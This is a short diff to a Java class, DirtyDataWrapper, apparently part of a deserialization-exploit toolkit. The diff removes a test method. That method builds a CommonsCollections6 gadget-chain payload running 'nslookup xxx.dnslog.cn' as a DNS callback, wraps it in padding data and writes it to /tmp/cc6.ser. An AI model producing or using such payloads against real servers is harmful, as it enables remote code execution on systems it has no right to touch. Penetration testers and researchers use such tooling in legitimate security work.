@@ -78,14 +78,4 @@ public class DirtyDataWrapper {
         }
         return str;
     }
-
-    // 测试
-    public static void main(String[] args) throws Exception{
-        Object cc6 = new CommonsCollections6().getObject("raw_cmd:nslookup xxx.dnslog.cn");
-        DirtyDataWrapper dirtyDataFactory = new DirtyDataWrapper(cc6,100);
-        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("/tmp/cc6.ser"));
-        objectOutputStream.writeObject(dirtyDataFactory.doWrap());
-        objectOutputStream.flush();
-        objectOutputStream.close();
-    }
 }
